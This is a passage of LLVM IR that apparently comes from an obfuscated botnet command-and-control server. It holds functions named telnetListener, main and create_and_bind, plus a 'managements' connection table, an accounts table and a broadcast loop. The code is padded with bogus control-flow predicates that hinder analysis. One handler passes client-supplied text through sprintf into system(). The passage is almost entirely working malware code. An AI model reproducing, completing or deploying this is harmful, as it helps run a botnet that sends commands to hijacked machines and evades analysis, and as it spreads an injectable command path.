  %2106 = sext i32 %2105 to i64
  %2107 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %2106
  %2108 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %2107, i32 0, i32 2
  %2109 = getelementptr inbounds [20 x i8], [20 x i8]* %2108, i32 0, i32 0
  %2110 = call i32 (i8*, i8*, ...) @sprintf(i8* %2104, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.82, i32 0, i32 0), i8* %2109) #7
  %2111 = load i32, i32* %35, align 4
  %2112 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %2113 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %2114 = call i64 @strlen(i8* %2113) #8
  %2115 = call i64 @send(i32 %2111, i8* %2112, i64 %2114, i32 16384)
  %2116 = icmp eq i64 %2115, -1
  br label %originalBB219

originalBB223alteredBB:                           ; preds = %originalBB223, %1550
  store i8* null, i8** %2, align 8
  br label %originalBB223

originalBB227alteredBB:                           ; preds = %originalBB227, %1598
  %2117 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2118 = call i8* @strtok(i8* %2117, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i32 0, i32 0)) #7
  store i8* %2118, i8** %38, align 8
  %2119 = load i8*, i8** %38, align 8
  %2120 = load i8*, i8** %38, align 8
  %2121 = call i64 @strlen(i8* %2120) #8
  %2122 = getelementptr inbounds i8, i8* %2119, i64 %2121
  %2123 = getelementptr inbounds i8, i8* %2122, i64 1
  %2124 = call i32 @atoi(i8* %2123) #8
  store i32 %2124, i32* %39, align 4
  %2125 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %2126 = load i32, i32* %4, align 4
  %2127 = sext i32 %2126 to i64
  %2128 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %2127
  %2129 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %2128, i32 0, i32 2
  %2130 = getelementptr inbounds [20 x i8], [20 x i8]* %2129, i32 0, i32 0
  %2131 = call i32 (i8*, i8*, ...) @sprintf(i8* %2125, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.82, i32 0, i32 0), i8* %2130) #7
  %2132 = load i32, i32* %39, align 4
  %2133 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %2134 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %2135 = call i64 @strlen(i8* %2134) #8
  %2136 = call i64 @send(i32 %2132, i8* %2133, i64 %2135, i32 16384)
  %2137 = icmp eq i64 %2136, -1
  br label %originalBB227

originalBB231alteredBB:                           ; preds = %originalBB231, %1636
  store i8* null, i8** %2, align 8
  br label %originalBB231

originalBB235alteredBB:                           ; preds = %originalBB235, %1672
  br label %originalBB235

originalBB239alteredBB:                           ; preds = %originalBB239, %1699
  br label %originalBB239

originalBB243alteredBB:                           ; preds = %originalBB243, %1739
  %2138 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2139 = call i8* @strtok(i8* %2138, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i32 0, i32 0)) #7
  store i8* %2139, i8** %40, align 8
  %2140 = load i8*, i8** %40, align 8
  %2141 = getelementptr inbounds i8, i8* %2140, i64 8
  store i8* %2141, i8** %41, align 8
  %2142 = load i8*, i8** %41, align 8
  call void @trim(i8* %2142)
  %2143 = getelementptr inbounds [50 x i8*], [50 x i8*]* %42, i32 0, i32 0
  %2144 = bitcast i8** %2143 to i8*
  %2145 = load i8*, i8** %41, align 8
  %2146 = call i32 (i8*, i8*, ...) @sprintf(i8* %2144, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.89, i32 0, i32 0), i8* %2145) #7
  %2147 = getelementptr inbounds [50 x i8*], [50 x i8*]* %42, i32 0, i32 0
  %2148 = bitcast i8** %2147 to i8*
  %2149 = call i32 @system(i8* %2148)
  %2150 = load i32, i32* %5, align 4
  %2151 = sext i32 %2150 to i64
  %2152 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %2151
  %2153 = getelementptr inbounds %struct.account, %struct.account* %2152, i32 0, i32 0
  %2154 = getelementptr inbounds [200 x i8], [200 x i8]* %2153, i32 0, i32 0
  %2155 = load i8*, i8** %41, align 8
  %2156 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.90, i32 0, i32 0), i8* %2154, i8* %2155)
  %2157 = load i32, i32* %4, align 4
  %2158 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %2159 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %2160 = call i64 @strlen(i8* %2159) #8
  %2161 = call i64 @send(i32 %2157, i8* %2158, i64 %2160, i32 16384)
  %2162 = icmp eq i64 %2161, -1
  br label %originalBB243

originalBB247alteredBB:                           ; preds = %originalBB247, %1782
  %2163 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %2163, %struct._IO_FILE** %43, align 8
  %2164 = load %struct._IO_FILE*, %struct._IO_FILE** %43, align 8
  %2165 = load i32, i32* %5, align 4
  %2166 = sext i32 %2165 to i64
  %2167 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %2166
  %2168 = getelementptr inbounds %struct.account, %struct.account* %2167, i32 0, i32 0
  %2169 = getelementptr inbounds [200 x i8], [200 x i8]* %2168, i32 0, i32 0
  %2170 = load i8*, i8** %41, align 8
  %2171 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2164, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.90, i32 0, i32 0), i8* %2169, i8* %2170)
  %2172 = load %struct._IO_FILE*, %struct._IO_FILE** %43, align 8
  %2173 = call i32 @fclose(%struct._IO_FILE* %2172)
  br label %originalBB247

originalBB251alteredBB:                           ; preds = %originalBB251, %1820
  br label %originalBB251

originalBB255alteredBB:                           ; preds = %originalBB255, %1837
  br label %originalBB255

originalBB259alteredBB:                           ; preds = %originalBB259, %1879
  br label %originalBB259
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #4

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: nounwind
declare i32 @snprintf(i8*, i64, i8*, ...) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #2

declare i32 @system(i8*) #1

; Function Attrs: noinline nounwind uwtable
define i8* @telnetListener(i32) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct._IO_FILE*, align 8
  %10 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  %11 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %11, i32* %4, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %12, 0
  br i1 %13, label %14, label %15

; <label>:14:                                     ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.94, i32 0, i32 0))
  br label %15

; <label>:15:                                     ; preds = %14, %1
  %16 = bitcast %struct.sockaddr_in* %7 to i8*
  call void @llvm.memset.p0i8.i64(i8* %16, i8 0, i64 16, i32 4, i1 false)
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %19 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %18, i32 0, i32 0
  store i32 0, i32* %19, align 4
  %20 = load i32, i32* %3, align 4
  %21 = trunc i32 %20 to i16
  %22 = call zeroext i16 @htons(i16 zeroext %21) #9
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %4, align 4
  %25 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %26 = call i32 @bind(i32 %24, %struct.sockaddr* %25, i32 16) #7
  %27 = icmp slt i32 %26, 0
  br i1 %27, label %28, label %29

; <label>:28:                                     ; preds = %15
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.95, i32 0, i32 0))
  br label %29

; <label>:29:                                     ; preds = %28, %15
  %30 = load i32, i32* %4, align 4
  %31 = call i32 @listen(i32 %30, i32 5) #7
  store i32 16, i32* %6, align 4
  br label %32

; <label>:32:                                     ; preds = %originalBBpart233, %29
  %33 = load i32, i32* @x.25
  %34 = load i32, i32* @y.26
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %32
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.96, i32 0, i32 0))
  %42 = bitcast %struct.sockaddr_in* %8 to { i64, i64 }*
  %43 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %42, i32 0, i32 0
  %44 = load i64, i64* %43, align 4
  %45 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %42, i32 0, i32 1
  %46 = load i64, i64* %45, align 4
  call void @client_addr(i64 %44, i64 %46)
  %47 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %47, %struct._IO_FILE** %9, align 8
  %48 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %50 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %49, i32 0, i32 0
  %51 = load i32, i32* %50, align 4
  %52 = and i32 %51, 255
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %54 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %53, i32 0, i32 0
  %55 = load i32, i32* %54, align 4
  %56 = and i32 %55, 65280
  %57 = lshr i32 %56, 8
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %59 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %58, i32 0, i32 0
  %60 = load i32, i32* %59, align 4
  %61 = and i32 %60, 16711680
  %62 = lshr i32 %61, 16
  %63 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %64 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %63, i32 0, i32 0
  %65 = load i32, i32* %64, align 4
  %66 = and i32 %65, -16777216
  %67 = lshr i32 %66, 24
  %68 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %48, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.97, i32 0, i32 0), i32 %52, i32 %57, i32 %62, i32 %67)
  %69 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %70 = call i32 @fclose(%struct._IO_FILE* %69)
  %71 = load i32, i32* %4, align 4
  %72 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %73 = call i32 @accept(i32 %71, %struct.sockaddr* %72, i32* %6)
  store i32 %73, i32* %5, align 4
  %74 = load i32, i32* %5, align 4
  %75 = icmp slt i32 %74, 0
  %76 = load i32, i32* @x.25
  %77 = load i32, i32* @y.26
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %75, label %84, label %85

; <label>:84:                                     ; preds = %originalBBpart2
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.98, i32 0, i32 0))
  br label %85

; <label>:85:                                     ; preds = %84, %originalBBpart2
  %86 = load i32, i32* @x.25
  %87 = load i32, i32* @y.26
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %85
  %94 = load i32, i32* %5, align 4
  %95 = sext i32 %94 to i64
  %96 = inttoptr i64 %95 to i8*
  %97 = call i32 @pthread_create(i64* %10, %union.pthread_attr_t* null, i8* (i8*)* @telnetWorker, i8* %96) #7
  %98 = load i32, i32* @x.25
  %99 = load i32, i32* @y.26
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br label %32
                                                  ; No predecessors!
  %107 = load i8*, i8** %2, align 8
  ret i8* %107

originalBBalteredBB:                              ; preds = %originalBB, %32
  %108 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.96, i32 0, i32 0))
  %109 = bitcast %struct.sockaddr_in* %8 to { i64, i64 }*
  %110 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %109, i32 0, i32 0
  %111 = load i64, i64* %110, align 4
  %112 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %109, i32 0, i32 1
  %113 = load i64, i64* %112, align 4
  call void @client_addr(i64 %111, i64 %113)
  %114 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %114, %struct._IO_FILE** %9, align 8
  %115 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %116 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %117 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %116, i32 0, i32 0
  %118 = load i32, i32* %117, align 4
  %_ = sub i32 %118, 255
  %gen = mul i32 %_, 255
  %119 = and i32 %118, 255
  %120 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %121 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %120, i32 0, i32 0
  %122 = load i32, i32* %121, align 4
  %123 = and i32 %122, 65280
  %_1 = sub i32 %123, 8
  %gen2 = mul i32 %_1, 8
  %_3 = sub i32 0, %123
  %gen4 = add i32 %_3, 8
  %_5 = sub i32 %123, 8
  %gen6 = mul i32 %_5, 8
  %_7 = sub i32 %123, 8
  %gen8 = mul i32 %_7, 8
  %124 = lshr i32 %123, 8
  %125 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %126 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %125, i32 0, i32 0
  %127 = load i32, i32* %126, align 4
  %_9 = shl i32 %127, 16711680
  %_10 = shl i32 %127, 16711680
  %_11 = shl i32 %127, 16711680
  %_12 = sub i32 %127, 16711680
  %gen13 = mul i32 %_12, 16711680
  %128 = and i32 %127, 16711680
  %_14 = sub i32 %128, 16
  %gen15 = mul i32 %_14, 16
  %_16 = shl i32 %128, 16
  %_17 = shl i32 %128, 16
  %129 = lshr i32 %128, 16
  %130 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %131 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %130, i32 0, i32 0
  %132 = load i32, i32* %131, align 4
  %133 = and i32 %132, -16777216
  %_18 = sub i32 0, %133
  %gen19 = add i32 %_18, 24
  %_20 = sub i32 0, %133
  %gen21 = add i32 %_20, 24
  %_22 = sub i32 %133, 24
  %gen23 = mul i32 %_22, 24
  %_24 = sub i32 %133, 24
  %gen25 = mul i32 %_24, 24
  %_26 = sub i32 %133, 24
  %gen27 = mul i32 %_26, 24
  %_28 = sub i32 0, %133
  %gen29 = add i32 %_28, 24
  %_30 = shl i32 %133, 24
  %134 = lshr i32 %133, 24
  %135 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %115, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.97, i32 0, i32 0), i32 %119, i32 %124, i32 %129, i32 %134)
  %136 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %137 = call i32 @fclose(%struct._IO_FILE* %136)
  %138 = load i32, i32* %4, align 4
  %139 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %140 = call i32 @accept(i32 %138, %struct.sockaddr* %139, i32* %6)
  store i32 %140, i32* %5, align 4
  %141 = load i32, i32* %5, align 4
  %142 = icmp slt i32 %141, 0
  br label %originalBB

originalBB31alteredBB:                            ; preds = %originalBB31, %85
  %143 = load i32, i32* %5, align 4
  %144 = sext i32 %143 to i64
  %145 = inttoptr i64 %144 to i8*
  %146 = call i32 @pthread_create(i64* %10, %union.pthread_attr_t* null, i8* (i8*)* @telnetWorker, i8* %145) #7
  br label %originalBB31
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #3

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #4

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**, i8**) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca [20 x i8], align 16
  %13 = alloca [20 x i8], align 16
  %14 = alloca i8*, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %15 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %16 = load i32, i32* %5, align 4
  %17 = icmp ne i32 %16, 4
  br i1 %17, label %18, label %24

; <label>:18:                                     ; preds = %3
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i8**, i8*** %6, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.99, i32 0, i32 0), i8* %22)
  call void @exit(i32 1) #10
  unreachable

; <label>:24:                                     ; preds = %3
  %25 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.101, i32 0, i32 0))
  store %struct._IO_FILE* %25, %struct._IO_FILE** @fileFD, align 8
  %26 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.101, i32 0, i32 0))
  store %struct._IO_FILE* %26, %struct._IO_FILE** @kfileFD, align 8
  %27 = load i8**, i8*** %6, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 3
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 @atoi(i8* %29) #8
  store i32 %30, i32* %10, align 4
  %31 = load i8**, i8*** %6, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 2
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @atoi(i8* %33) #8
  store i32 %34, i32* %9, align 4
  %35 = load i32, i32* %9, align 4
  %36 = icmp sgt i32 %35, 850
  br i1 %36, label %37, label %39

; <label>:37:                                     ; preds = %24
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.103, i32 0, i32 0))
  ret i32 0

; <label>:39:                                     ; preds = %24
  %40 = load i32, i32* %10, align 4
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.104, i32 0, i32 0), i32 %40)
  %42 = load i8**, i8*** %6, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 1
  %44 = load i8*, i8** %43, align 8
  %45 = call i32 @create_and_bind(i8* %44)
  store volatile i32 %45, i32* @listenFD, align 4
  %46 = load volatile i32, i32* @listenFD, align 4
  %47 = icmp eq i32 %46, -1
  br i1 %47, label %48, label %65

; <label>:48:                                     ; preds = %39
  %49 = load i32, i32* @x.27
  %50 = load i32, i32* @y.28
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %48
  call void @abort() #10
  %57 = load i32, i32* @x.27
  %58 = load i32, i32* @y.28
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  unreachable

; <label>:65:                                     ; preds = %39
  %66 = load volatile i32, i32* @listenFD, align 4
  %67 = call i32 @make_socket_non_blocking(i32 %66)
  store i32 %67, i32* %8, align 4
  %68 = load i32, i32* %8, align 4
  %69 = icmp eq i32 %68, -1
  br i1 %69, label %70, label %71

; <label>:70:                                     ; preds = %65
  call void @abort() #10
  unreachable

; <label>:71:                                     ; preds = %65
  %72 = load volatile i32, i32* @listenFD, align 4
  %73 = call i32 @listen(i32 %72, i32 128) #7
  store i32 %73, i32* %8, align 4
  %74 = load i32, i32* %8, align 4
  %75 = icmp eq i32 %74, -1
  br i1 %75, label %76, label %77

; <label>:76:                                     ; preds = %71
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.105, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:77:                                     ; preds = %71
  %78 = call i32 @epoll_create1(i32 0) #7
  store volatile i32 %78, i32* @epollFD, align 4
  %79 = load volatile i32, i32* @epollFD, align 4
  %80 = icmp eq i32 %79, -1
  br i1 %80, label %81, label %82

; <label>:81:                                     ; preds = %77
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.106, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:82:                                     ; preds = %77
  %83 = load volatile i32, i32* @listenFD, align 4
  %84 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %85 = bitcast %union.epoll_data* %84 to i32*
  store i32 %83, i32* %85, align 1
  %86 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %86, align 1
  %87 = load volatile i32, i32* @epollFD, align 4
  %88 = load volatile i32, i32* @listenFD, align 4
  %89 = call i32 @epoll_ctl(i32 %87, i32 1, i32 %88, %struct.epoll_event* %11) #7
  store i32 %89, i32* %8, align 4
  %90 = load i32, i32* %8, align 4
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %109

; <label>:92:                                     ; preds = %82
  %93 = load i32, i32* @x.27
  %94 = load i32, i32* @y.28
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %92
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0))
  call void @abort() #10
  %101 = load i32, i32* @x.27
  %102 = load i32, i32* @y.28
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  unreachable

; <label>:109:                                    ; preds = %82
  %110 = load i32, i32* %9, align 4
  %111 = add nsw i32 %110, 2
  %112 = zext i32 %111 to i64
  %113 = call i8* @llvm.stacksave()
  store i8* %113, i8** %14, align 8
  %114 = alloca i64, i64 %112, align 16
  br label %115

; <label>:115:                                    ; preds = %originalBBpart211, %109
  %116 = load i32, i32* %9, align 4
  %117 = add nsw i32 %116, -1
  store i32 %117, i32* %9, align 4
  %118 = icmp ne i32 %116, 0
  br i1 %118, label %119, label %141

; <label>:119:                                    ; preds = %115
  %120 = load i32, i32* @x.27
  %121 = load i32, i32* @y.28
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %119
  %128 = load i32, i32* %9, align 4
  %129 = add nsw i32 %128, 1
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i64, i64* %114, i64 %130
  %132 = call i32 @pthread_create(i64* %131, %union.pthread_attr_t* null, i8* (i8*)* @epollEventLoop, i8* null) #7
  %133 = load i32, i32* @x.27
  %134 = load i32, i32* @y.28
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart211, label %originalBB6alteredBB

originalBBpart211:                                ; preds = %originalBB6
  br label %115

; <label>:141:                                    ; preds = %115
  %142 = getelementptr inbounds i64, i64* %114, i64 0
  %143 = load i32, i32* %10, align 4
  %144 = sext i32 %143 to i64
  %145 = inttoptr i64 %144 to i8*
  %146 = call i32 @pthread_create(i64* %142, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @telnetListener to i8* (i8*)*), i8* %145) #7
  br label %147

; <label>:147:                                    ; preds = %148, %141
  br label %148

; <label>:148:                                    ; preds = %147
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i32 -1, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.107, i32 0, i32 0))
  %149 = call i32 @sleep(i32 60)
  br label %147

originalBBalteredBB:                              ; preds = %originalBB, %48
  call void @abort() #10
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %92
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0))
  call void @abort() #10
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %119
  %150 = load i32, i32* %9, align 4
  %_ = shl i32 %150, 1
  %_7 = sub i32 0, %150
  %gen = add i32 %_7, 1
  %_8 = sub i32 %150, 1
  %gen9 = mul i32 %_8, 1
  %151 = add nsw i32 %150, 1
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds i64, i64* %114, i64 %152
  %154 = call i32 @pthread_create(i64* %153, %union.pthread_attr_t* null, i8* (i8*)* @epollEventLoop, i8* null) #7
  br label %originalBB6
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: noinline nounwind uwtable
define internal i32 @create_and_bind(i8*) #0 {
  %2 = load i32, i32* @x.29
  %3 = load i32, i32* @y.30
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca %struct.addrinfo, align 8
  %13 = alloca %struct.addrinfo*, align 8
  %14 = alloca %struct.addrinfo*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  store i8* %0, i8** %11, align 8
  %18 = bitcast %struct.addrinfo* %12 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 48, i32 8, i1 false)
